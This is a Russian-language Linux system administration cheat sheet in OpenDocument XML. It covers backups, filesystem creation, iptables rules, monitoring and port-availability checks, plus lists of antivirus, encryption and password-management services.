      <text:p text:style-name="P1"># rsync -rogpav -e ssh --delete /home ip_address:/tmp - Синхронизация через SSH туннель</text:p>
      <text:p text:style-name="P1"># rsync -az -e ssh --delete /home/local ip_addr:/home/public - Синхронизировать удалённую директорию с локальной используя ssh туннель со сжатием</text:p>
      <text:p text:style-name="P1"># dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr 'dd of=hda.gz' - Создать "слепок" локального диска в файл на удалённом сервере используя ssh туннель</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># dd if=/dev/hda of=/dev/fd0 bs=512 count=1 - </text:span><text:span text:style-name="T3">Создание</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">копии</text:span><text:span text:style-name="T2"> MBR ( Master Boot Record ) </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> /dev/hda </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">флоппи</text:span><text:span text:style-name="T2">-</text:span><text:span text:style-name="T3">диск</text:span></text:p>
      <text:p text:style-name="P1"># dd if=/dev/sda of=/tmp/backup - Создание резервной копии содержимого жесткого диска в файл backup</text:p>
      <text:p text:style-name="P1"># dd if=/dev/fd0 of=/dev/hda bs=512 count=1 - Восстановить MBR с флоппи-диска на /dev/hda</text:p>
      <text:p text:style-name="P1"># dump -0aj -f /tmp/home0.bak /home - Создать полную резервную копию директории /home в файл /tmp/home0.bak</text:p>
      <text:p text:style-name="P1"># dump -1aj -f /tmp/home0.bak /home - Создать инкрементную резервную копию директории /home в файл /tmp/home0.bak</text:p>
      <text:p text:style-name="P1"># restore -if /tmp/home0.bak - Восстановить данные из резервной копии /tmp/home0.bak</text:p>
      <text:p text:style-name="P1"># tar -Puf backup.tar /home/user - Создать инкрементную резервную копию директории /home/user в файл backup.tar сохраняя права доступа</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># ( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr 'cd /home/share/ &amp;&amp; tar x -p' - </text:span><text:span text:style-name="T3">Упаковка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">архив</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">копирование</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">содержимого</text:span><text:span text:style-name="T2"> /tmp/local </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">директорию</text:span><text:span text:style-name="T2"> /home/share/ </text:span><text:span text:style-name="T3">удалённого</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервера</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">используя</text:span><text:span text:style-name="T2"> ssh </text:span><text:span text:style-name="T3">туннель</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># ( tar c /home ) | ssh -C user@ip_addr 'cd /home/backup-home &amp;&amp; tar x -p' - </text:span><text:span text:style-name="T3">Упаковка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">архив</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">копирование</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">содержимого</text:span><text:span text:style-name="T2"> /home </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">директорию</text:span><text:span text:style-name="T2"> /home/backup-home </text:span><text:span text:style-name="T3">удалённого</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервера</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">используя</text:span><text:span text:style-name="T2"> ssh </text:span><text:span text:style-name="T3">туннель</text:span></text:p>
      <text:p text:style-name="P7"># tar cf - . | (cd /tmp/backup ; tar xf - ) - Упаковка в архив и копирование одной директории в другую с сохранением прав доступа и ссылок</text:p>
      <text:p text:style-name="P1">Форматирование файловой системы</text:p>
      <text:p text:style-name="P1"># fdformat -n /dev/fd0 - Форматирование флоппи-диска без проверки</text:p>
      <text:p text:style-name="P1"># mkfs /dev/hda1 - Создать файловую систему linux на разделе hda1</text:p>
      <text:p text:style-name="P1"># mke2fs -j /dev/hda1 - Создать журналируемую файловую систему ext3 на разделе hda1</text:p>
      <text:p text:style-name="P1"># mke2fs /dev/hda1 - Создание файловой системы ext2 на разделе hda1</text:p>
      <text:p text:style-name="P7"># mkfs -t vfat 32 -F /dev/hda1 - Создать файловую систему FAT32 на разделе hda</text:p>
      <text:p text:style-name="P17">Файловая система SWAP</text:p>
      <text:p text:style-name="P1"># mkswap /dev/hda3 - Создание swap-пространство на разделе hda3</text:p>
      <text:p text:style-name="P1"># swapon /dev/hda3 - Включить swap-пространство, расположенное на разделе hda3</text:p>
      <text:p text:style-name="P7"># swapon /dev/hda2 /dev/hdb3 - Активировать swap-пространства, расположенные на разделах hda2 и hdb3</text:p>
      <text:p text:style-name="P1">Конвертирование содержимого текстовых файлов</text:p>
      <text:p text:style-name="P1"># dos2unix filedos.txt fileunix.txt - Конвертировать содержимое текстового файла из MSDOS кодировки в UNIX кодировку (разница в символах возврата коретки)</text:p>
      <text:p text:style-name="P1"># unix2dos fileunix.txt filedos.txt - Конвертировать содержимое текстового файла из UNIX кодировки в MSDOS кодировку (разница в символах возврата коретки)</text:p>
      <text:p text:style-name="P1"># recode ..HTML &lt; page.txt &gt; page.html - Конвертировать содержимое тестового файла page.txt в html-файл page.html</text:p>
      <text:p text:style-name="P7"># recode -l | more - Вывести список доступных форматов</text:p>
      <text:p text:style-name="P1">Microsoft Windows networks (samba)</text:p>
      <text:p text:style-name="P1"># mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share - Монтировать smb-ресурс, расшаренный на windows-машине, в папку локальной файловой системы</text:p>
      <text:p text:style-name="P1"># nbtscan ip_addr - Преобразовать имя netbios. Программа nbtscan не во всех системах присутствует по-умолчанию, nmblookup включен в пакет samba</text:p>
      <text:p text:style-name="P1"># nmblookup -A ip_addr - Преобразовать имя netbios. Программа nbtscan не во всех системах присутствует по-умолчанию, nmblookup включен в пакет samba</text:p>
      <text:p text:style-name="P1"># smbclient -L ip_addr/hostname - Вывести список ресурсов, выделенных в общий доступ на windows-машине</text:p>
      <text:p text:style-name="P7"># smbget -Rr smb://ip_addr/share - Аналог программы wget для SMB протокола</text:p>
      <text:p text:style-name="P1">Фаервол IPTABLES, штатный, для большинства дистрибутивов Linux</text:p>
      <text:p text:style-name="P1"># iptables -t filter -L - Вывести список всец цепочек правил</text:p>
      <text:p text:style-name="P1"># iptables -t nat -L - Вывести все цепочки из NAT таблицы</text:p>
      <text:p text:style-name="P1"># iptables -t nat -F - Очистить все цепочки правил в таблице NAT</text:p>
      <text:p text:style-name="P1"># iptables -t filter -X - Очистить все пользовательские цепочки правил в таблице filter</text:p>
      <text:p text:style-name="P1"># iptables -t filter -F - Очистить все цепочки правил в таблице filter</text:p>
      <text:p text:style-name="P1"># iptables -t filter -A INPUT -p tcp --dport telnet -j ACCEPT - Разрешить входящие соединения с telnet</text:p>
      <text:p text:style-name="P1"># iptables -t filter -A OUTPUT -p tcp --dport http -j DROP - Запретить исходящие HTTP соединения</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"># iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE - </text:span><text:span text:style-name="T3">включить</text:span><text:span text:style-name="T2"> NAT (Network Address Translate) </text:span><text:span text:style-name="T3">исходящих</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакетов</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">интерфейс</text:span><text:span text:style-name="T2"> eth0. </text:span><text:span text:style-name="T3">Допустимо</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">при</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">использовании</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">динамически</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">выделяемыми</text:span><text:span text:style-name="T2"> ip-</text:span><text:span text:style-name="T3">адресами</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp --dport 22 -j DNAT --to-destination 10.0.0.2:22 - </text:span><text:span text:style-name="T3">Пересылка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакетов</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">адресованных</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">одному</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">хосту</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">другой</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">хост</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># iptables -t filter -A INPUT -j LOG --log-prefix - </text:span><text:span text:style-name="T3">Включить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">логгирование</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакетов</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">проходящих</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">через</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">цепочку</text:span><text:span text:style-name="T2"> INPUT, </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">добавлением</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">к</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сообщению</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">префикса</text:span><text:span text:style-name="T2"> "DROP INPUT"</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2"># iptables -t filter -A FORWARD -p tcp --dport pop3 -j ACCEPT - </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">форвардинг</text:span><text:span text:style-name="T2"> POP3 </text:span><text:span text:style-name="T3">соединений</text:span></text:p>
      <text:p text:style-name="P1">Мониторинг и отладка системы</text:p>
      <text:p text:style-name="P1"># free -m - Вывод статистики по оперативной памяти</text:p>
      <text:p text:style-name="P1"># kill -9 proc_id - Убить процесс с PID proc_id, без соблюдения целостности данных, то есть насмерть</text:p>
      <text:p text:style-name="P1"># kill -1 proc_id - Перечитать файл конфигурации процессом с PID proc_id</text:p>
      <text:p text:style-name="P1"># last reboot - Вывод истории ребутов системы</text:p>
      <text:p text:style-name="P1"># lsof /home/user1 - Вывести список открытых файлов из директории /home/user1</text:p>
      <text:p text:style-name="P1"># lsof -p proc_id - Вывести список файлов, открытых процессом с PID proc_id</text:p>
      <text:p text:style-name="P1"># lsmod - Список загруженных модулей ядра</text:p>
      <text:p text:style-name="P1"># ps -e -o pid,args --forest - Вывести список PID'ов и процессов в виде дерева</text:p>
      <text:p text:style-name="P1"># ps -eafw - Отобразить работающие в системе процессы, используемые ими ресурсы и другую полезную информацию ( единожды )</text:p>
      <text:p text:style-name="P1"># pstree - Вывести дерево процессов</text:p>
      <text:p text:style-name="P1"># smartctl -i /dev/hda - Проверить доступность SMART на жёстком диске /dev/hda</text:p>
      <text:p text:style-name="P1"># smartctl -A /dev/hda - Проверка состояния жёсткого диска /dev/hda через SMART</text:p>
      <text:p text:style-name="P1"># strace -c ls &gt;/dev/null - Вывести список системных вызовов, созданных и полученных процессом ls</text:p>
      <text:p text:style-name="P1"># strace -f -e open ls &gt;/dev/null - Вывести список вызовов системных бибилотек</text:p>
      <text:p text:style-name="P1"># tail /var/log/messages - Вывести десять последних записей из системного журнала</text:p>
      <text:p text:style-name="P1"># tail /var/log/dmesg - Вывести десять последних записей из журнала загрузки ядра</text:p>
      <text:p text:style-name="P1"># top - Вывести список работающих в системе процессов с различной полезной информацией в режиме реального времени с автоматическим обновлением данных</text:p>
      <text:p text:style-name="P1"># watch -n1 'cat /proc/interrupts' - Выводить прерывания в режиме реального времени</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Другие полезные команды</text:span></text:p>
      <text:p text:style-name="P1"># alias hh='history' - Создать псевдоним hh для команды history</text:p>
      <text:p text:style-name="P1"># apropos ...keyword - Вывод комманд, так или иначе относящихся к ключевым словам. Полезно, когда вы знаете что делает программа, но не помните команду</text:p>
      <text:p text:style-name="P1"># chsh - Изменить системную оболочку пользователя</text:p>
      <text:p text:style-name="P1"># gpg -c file1 - Шифрует файл file1 с помощью GNU Privacy Guard</text:p>
      <text:p text:style-name="P1"># gpg file1.gpg - Дешифрует файл file1 с помощью GNU Privacy Guard</text:p>
      <text:p text:style-name="P1"># ldd /usr/bin/ssh - Список библиотек, используемых программой ssh</text:p>
      <text:p text:style-name="P1"># man ping - Ввывод страниц руководства по работе с программой, в данном случае, ping</text:p>
      <text:p text:style-name="P1"># mkbootdisk --device /dev/fd0 `uname -r` - Создаёт загрузочный флоппи-диск</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># wget -r www.example.com - Рекурсивно загружает содержимое сайта </text:span><text:a xlink:type="simple" xlink:href="http://www.example.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T4">www.example.com</text:span></text:a></text:p>
      <text:p text:style-name="P13"># wget -c www.example.com/file.iso - Загрузить файл www.example.com/file.iso с возможностью остановки и докачки</text:p>
      <text:p text:style-name="P1"># echo 'wget -c www.example.com/files.iso' | at 09:00 - Включить закачку в определенное время</text:p>
      <text:p text:style-name="P1"># whatis ...keyword - Вывести описание действий указанной программы</text:p>
      <text:p text:style-name="P7"># who -a - Вывести список залогиненных пользователей, время последней загрузки системы и прочую полезную информацию</text:p>
      <text:p text:style-name="P7">Что такое inode в Linux? Индексный дескриптор в файловой системе, который хранит метаданные о файлах, за исключением имени файла. В дескрипторе хранится: длина файла в байтах, id устройства с файлом, id пользователя владельца файла, id группы файла, режим файла (права доступа), timestamp последнего изменения файла, счётчик хардлинков, указатели на блоки файла.</text:p>
      <text:p text:style-name="P1">Как преобразовать Linux dd образ img в .VDI, VMDK, VHD с помощью команды VIrtualBox. Конвертация IMG файлов в формат VDI, VMDK, VHD для Oracle VirtualBox, Vmware и XenCenter.</text:p>
      <text:p text:style-name="P1">Сначала нам нужно взять образ из системы Linux, и это займет некоторое время.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dd if=/dev/sda of=/mnt/run/media/filename.img bs=4M</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">1. Откройте окно cmd.</text:p>
      <text:p text:style-name="P1">Нажмите Выполнить -&gt; cmd -&gt; Enter</text:p>
      <text:p text:style-name="P1">2. Обратите внимание, что Windows открывает окно DOS.</text:p>
      <text:p text:style-name="P1">Затем перейдите к dd image drive.</text:p>
      <text:p text:style-name="P1">3. Для этой работы необходимо установить Oracle Virtual box.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Для</text:span><text:span text:style-name="T2"> Virtual Box:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">I:\&gt;VBoxManage convertfromraw --format VDI sourcefile.dd filename.VDI</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Для</text:span><text:span text:style-name="T2"> Vmware ESXi:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">I:\&gt;VBoxManage convertfromraw --format VMDK sourcefile.dd filename.VMDK</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Для</text:span><text:span text:style-name="T2"> Hyper-V:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">I:\&gt;VBoxManage convertfromraw --format VHD sourcefile.dd filename.VHD</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Нажмите Enter, чтобы начать преобразование.</text:p>
      <text:p text:style-name="P1">Подождите около полутора минут, пока конвертирование будет происходить, а затем создайте новую виртуальную машину с файлом VDI.</text:p>
      <text:p text:style-name="P1">Как преобразовать образ диска гостевой виртуальной машины VirtualBox из VMDK в VDI</text:p>
      <text:p text:style-name="P1">Администратор VirtualBox хочет перенести формат образа диска существующей импортированной гостевой ВМ из VMDK в собственный формат файлов VirtualBox, например VDI.</text:p>
      <text:p text:style-name="P1">VirtualBox обеспечивает поддержку преобразования файлов образов дисков с помощью команды “VBoxManage clonemedium”.</text:p>
      <text:p text:style-name="P1">Как всегда, административной “лучшей практикой” считается сохранение критически важных компонентов в архиве резервных копий перед выполнением инвазивных административных действий такого рода.</text:p>
      <text:p text:style-name="P1">Пример синтаксиса команды для этой операции в VirtualBox 6.0:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># VBoxManage clonemedium disk [inputfile] [outputfile] --format VDI</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16">Примечание: более ранние версии VirtualBox предоставляли аналогичную функциональность с помощью команд clonevdi и clonehd.</text:p>
      <text:p text:style-name="P13">Вместо 1000 антивирусов</text:p>
      <text:p text:style-name="P1">1. Hybrid Analysis (https://www.hybrid-analysis.com/) - онлайн песочница, в которой можно проверить любой файл. После его отправки на проверку, сайт запускает его в изолированной песочнице VirtualBox или VMware, а затем смотрит, как он поведет себя в системе и делает вывод: опасен он для неё или нет. Из систем есть Windows, Linux Ubuntu и Android.</text:p>
      <text:p text:style-name="P1">2. Virus Total (https://www.virustotal.com/gui/home/upload) - <text:s/>самый популярный онлайн антивирус. Проверяет файлы и ссылки. Имеет своего бота здесь (https://t.me/VirusTotalAV_bot), однако внутри можно увидеть много стрёмной рекламы. </text:p>
      <text:p text:style-name="P1">3. Dr. Web - бот, позволяющий проверить подозрительные файлы и ссылки тремя способами: сообщение напрямую, пересланное сообщение из другого чата или же просто добавить бота в чат, где он будет проверять все медиа и ссылки автоматически, по мере их поступления. </text:p>
      <text:p text:style-name="P1">4. MetaDefender Cloud - мощный антивирусный сканер файлов, ссылок, IP адресов, доменов и хешей. </text:p>
      <text:p text:style-name="P7">5. ClamAV - пакет антивирусного ПО, работающий во многих операционных системах, включая Unix-подобные ОС, OpenVMS, Microsoft Windows и Apple Mac OS X.</text:p>
      <text:p text:style-name="P1">Подборка сервисов для шифрования, хеширования и расшифровки данных онлайн</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">1. https://sanstv.ru/tools/crypt - поддерживаемые алгоритмы: cast-128, gost, rijndael-128, twofish, cast-256, loki97, rijndael-192, saferplus, blowfish-compat, des, rijndael-256, serpent, xtea, blowfish, rc2, tripledes, md5 (Хеш), sha1 (Хеш), base64, crc32 (Расчет контрольной суммы), Русский текст -&gt; Транслит, ABC -&gt; \xAA.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. http://crypt-online.ru/ - поддерживаемые алгоритмы: base64, MD5, SHA256, AES(128-256), RC4, RSA. Утилиты</text:span><text:span text:style-name="T2">: Text to hex, Hex to text, Json, QR </text:span><text:span text:style-name="T3">коды</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">др</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P1">3. https://planetcalc.ru/search/?tag=813 - поддерживает шифр Цезаря, Виженера, Хилла, Атбаш, A1Z26, Плейфера и шифр масонов. </text:p>
      <text:p text:style-name="P1">4. https://www.dcode.fr/ - известный сайт, поддерживает многие алгоритмы, есть математические, IT инструменты и не только.</text:p>
      <text:p text:style-name="P7">5. https://www.boxentriq.com/code-breaking/cipher-identifier - определяет тип шифра, есть инструменты работы с текстом.</text:p>
      <text:p text:style-name="P1">Блокировка учетной записи пользователя: </text:p>
      <text:p text:style-name="P1">$ passwd -l user_name </text:p>
      <text:p text:style-name="P1">Проверка состояния учетной записи:</text:p>
      <text:p text:style-name="P1">$ passwd -S user_name</text:p>
      <text:p text:style-name="P1">Разблокировка пользователя: </text:p>
      <text:p text:style-name="P7">$ passwd -u user_name</text:p>
      <text:p text:style-name="P1">Все для ваших паролей</text:p>
      <text:p text:style-name="P1">1. Генераторы</text:p>
      <text:p text:style-name="P13">omgopass - сервис для создания надежных и легко запоминающихся паролей.</text:p>
      <text:p text:style-name="P13">Identiji <text:s/>- расширение для генерации паролей с помощью эмодзи. </text:p>
      <text:p text:style-name="P1">EasyStrongPassword (https://t.me/EasyStrongPasswordBot) - генератор сложных и простых паролей + мнемонических фраз.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">2. </text:span><text:span text:style-name="T3">Проверка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">брут</text:span><text:span text:style-name="T2">/</text:span><text:span text:style-name="T3">слив</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">How secure is my password? </text:span><text:span text:style-name="T3">(https://howsecureismypassword.net/) - <text:s/>сервис для проверки надежности ваших паролей. Показывает примерное время взлома вашего пароля (подбора).</text:span></text:p>
      <text:p text:style-name="P1">DeHashed - <text:s/>сервис поиска по базе взломанных и украденных персональных данных. </text:p>
      <text:p text:style-name="P1">Kaspersky Password Checker - <text:s/>весьма неплохой чекер паролей на устойчивость к взлому и наличии в базах. </text:p>
      <text:p text:style-name="P1">Подборка чекеров утечек - всевозможные сервисы для проверки ваших паролей на предмет утечки.</text:p>
      <text:p text:style-name="P1">3. Хранение </text:p>
      <text:p text:style-name="P1">Spectre (https://spectre.app/) - надежный менеджер паролей, не хранящий ваши пароли по факту, а генерирующий их на лету. </text:p>
      <text:p text:style-name="P1">Buttercup - это кроссплатформенный менеджер паролей с открытым исходным кодом, написанный на NodeJS с Typescript.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Dashlane - менеджер + генератор сложных паролей.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>KeePassDX - <text:s/>менеджер паролей с открытым исходным кодом. Для пользователей Android.</text:p>
      <text:p text:style-name="P1">KeeWeb - бесплатный кросс-платформенный менеджер паролей, совместимый с KeePass.</text:p>
      <text:p text:style-name="P1">Bitwarden - <text:s/>бесплатный и открытый менеджер паролей. Поддерживает безопасную синхронизацию между всеми устройствами с возможностью хостинга на собственном сервере.</text:p>
      <text:p text:style-name="P7">stash - <text:s/>это консольная программа/зашифрованное текстовое хранилище для пользователей Linux и Mac.</text:p>
      <text:p text:style-name="P1">Проверяем доступность портов с использованием nmap/netcat/telnet/nc</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Доступность</text:span><text:span text:style-name="T2"> tcp-</text:span><text:span text:style-name="T3">порта</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat [options] host port</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">сканер</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">портов</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat -z -v domain.com 1-1000</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">запустить netcat на хосте и слушать на tcp порте 4444:</text:p>
      <text:p text:style-name="P1">netcat -l 4444</text:p>
      <text:p text:style-name="P1">а на другой машине проверить подключение к netcat, запущенному на другом хосте:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat domain.com 4444</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc -vt &lt;ip&gt; &lt;port&gt;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">telnet</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">telnet &lt;ip&gt; &lt;port&gt;</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">nmap</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">порт</text:span><text:span text:style-name="T2"> 25 tcp: nmap -p25 11.11.11.11</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Доступность</text:span><text:span text:style-name="T2"> udp-</text:span><text:span text:style-name="T3">порта</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netcat -u host port</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc -vu &lt;ip&gt; &lt;port&gt;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">nmap</text:p>
      <text:p text:style-name="P7">доступность порта udp 53: nmap -sU -p U:53 11.1.11.12</text:p>
      <text:p text:style-name="P1">Стандартные инструменты для диагностики системы Linux</text:p>
      <text:p text:style-name="P1">Ядро:</text:p>
      <text:p text:style-name="P1">* perf - (в прошлом performance counters for Linux) - доступ к различным внутренним счётчикам ядра; незаменимый инструмент для выполнения профайлинга ядра/операционной системы</text:p>
      <text:p text:style-name="P1">* ftrace - трассировщик вызовов функций внутри ядра Linux</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">* stap - скриптовый язык и инструмент для комплексной диагностики ядра и процессов Linux</text:span></text:p>
      <text:p text:style-name="P1">* lttng - (Linux Trace Toolkit Next Generation) инструмент для трассировки ядра, программ и библиотек Linux</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>* bcc (BPF) - (сравнительно) новый и очень мощный инструмент для трассировки и манипуляции ядром Linux, основанный на Berkeley Packet Filter, позволяет делать космические вещи</text:p>
      <text:p text:style-name="P1">Ввод/вывод:</text:p>
      <text:p text:style-name="P1">* iostat (sysstat) - статистика ввода/вывода по заданному устройству (количество операций записи/чтения в единицу времени, скорость записи/чтения)</text:p>
      <text:p text:style-name="P1">* pidstat (sysstat) - нагрузка на процессор, память и устройства от конкретного процесса (заданного по имени или номеру)</text:p>
      <text:p text:style-name="P1">* pcstat - использование кэша (какой процент файла попадает в кэш, какой нет)</text:p>
      <text:p text:style-name="P1">* lsof - информация об открытых процессом файлах</text:p>
      <text:p text:style-name="P1">blktrace</text:p>
      <text:p text:style-name="P1">Системные и библиотечные вызовы:</text:p>
      <text:p text:style-name="P1">* strace - информация о системных вызовах, выполняемых процессом, позволяет понять или по крайней мере лучше разобраться, почему процесс висит или потребляет много ресурсов</text:p>
      <text:p text:style-name="P1">* ltrace - трассировка библиотечных вызовов (которые не обязательно являются системными)</text:p>
      <text:p text:style-name="P1">Аппаратные счётчики:</text:p>
      <text:p text:style-name="P1">* tiptop - информация о процессах в реальном времени, похожа на top, но в отличие от него данные преимущественно берутся с аппаратных счётчиков</text:p>
      <text:p text:style-name="P1">* numastat - просмотр информации об использовании памяти процессами/процессорами в системах с NUMA-архитектурой</text:p>
      <text:p text:style-name="P1">Сеть:</text:p>
      <text:p text:style-name="P13">* netstat - классический инструмент для просмотра конфигурации сети (сокетов, интерфейсов и так далее)</text:p>
      <text:p text:style-name="P13">* ss - socket statistics, позволяет получить информацию об открытых сокетах и их состоянии (похожа на netstat, но умеет больше)</text:p>
      <text:p text:style-name="P1">* ethtool - просмотр настроек и состояния ethernet-интерфейса</text:p>
      <text:p text:style-name="P1">* snmpget - получение данных по SNMP</text:p>
      <text:p text:style-name="P1">* lldptool - настройка LLDP и просмотр данных LLDP</text:p>
      <text:p text:style-name="P1">* nicstat - статистика использования сетевой карты (сетевого интерфейса)</text:p>
      <text:p text:style-name="P1">* ip - конфигурация и статистика стека TCP/IP Linux</text:p>
      <text:p text:style-name="P1">* ifstat - статистика использования сетевого интерфейса в реальном времени</text:p>
      <text:p text:style-name="P1">Процессы:</text:p>
      <text:p text:style-name="P1">* top - информация о наиболее активных (наиболее ресурсоёмки) процессах + общая информация о системе</text:p>
      <text:p text:style-name="P1">* vmstat - данные об использовании виртуальной памяти</text:p>
      <text:p text:style-name="P1">* free - информация о свободной памяти, кэше, буферах</text:p>
